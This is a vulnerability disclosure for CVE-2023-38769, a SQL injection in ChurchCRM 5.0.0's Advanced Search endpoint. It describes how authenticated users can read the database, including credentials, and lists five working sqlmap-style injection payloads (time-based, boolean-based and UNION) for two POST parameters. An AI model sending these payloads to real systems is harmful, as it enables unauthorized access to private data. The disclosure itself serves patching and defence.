# CVE-2023-38769 - SQL Injection in /QueryView.php?QueryID=15

## Description
A SQL injection vulnerability in ChurchCRM v.5.0.0 allows a remote attacker to obtain sensitive database information via the searchstring and searchwhat parameters within the /QueryView.php endpoint. An authenticated attacker can use injection to perform arbitrary SQL queries via POST request with the searchstring parameter or searchwhat parameter at the /QueryView.php?QueryID=15 endpoint (Advanced Search query). This can be used for information disclosure of anything in the database, including user credentials.

## Proof of Concept
Parameter: searchstring (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchstring=mysearch' AND (SELECT 7950 FROM (SELECT(SLEEP(5)))cPdR) AND 'Wjub'='Wjub&searchwhat=fam_State&Submit=Execute Query

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: searchstring=mysearch' UNION ALL SELECT CONCAT(0x7170707871,0x6567567575715644427153464f774859566353414f76556a596a64706b66734653534469644b5a44,0x717a766271),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&searchwhat=fam_State&Submit=Execute Query

Parameter: searchwhat (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: searchstring=mysearch&searchwhat=(SELECT (CASE WHEN (3992=3992) THEN 0x66616d5f5374617465 ELSE (SELECT 2631 UNION SELECT 9688) END))&Submit=Execute Query

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchstring=mysearch&searchwhat=fam_State AND (SELECT 5609 FROM (SELECT(SLEEP(5)))UgmU)&Submit=Execute Query

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: searchstring=mysearch&searchwhat=fam_State UNION ALL SELECT CONCAT(0x7170707871,0x6866525074684d4473744d4748546c69474958665a46646d7070664d5261526b72755347436d6542,0x717a766271),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&Submit=Execute Query


